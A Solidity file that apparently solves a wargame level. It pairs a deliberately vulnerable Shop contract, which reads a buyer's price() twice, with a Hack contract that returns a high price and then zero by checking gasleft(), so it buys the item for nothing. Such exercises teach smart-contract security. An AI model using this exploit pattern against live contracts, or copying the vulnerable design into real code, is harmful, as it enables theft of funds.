// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Hack {

    Shop public shop;

    constructor (address _address) {
        shop = Shop(_address);
    }

    function buy () external {
        shop.buy();
    }

    function price() public returns (uint) {
        if (gasleft() > 20000){
            return 120;
        }else {
            return 0;
        }
    }
}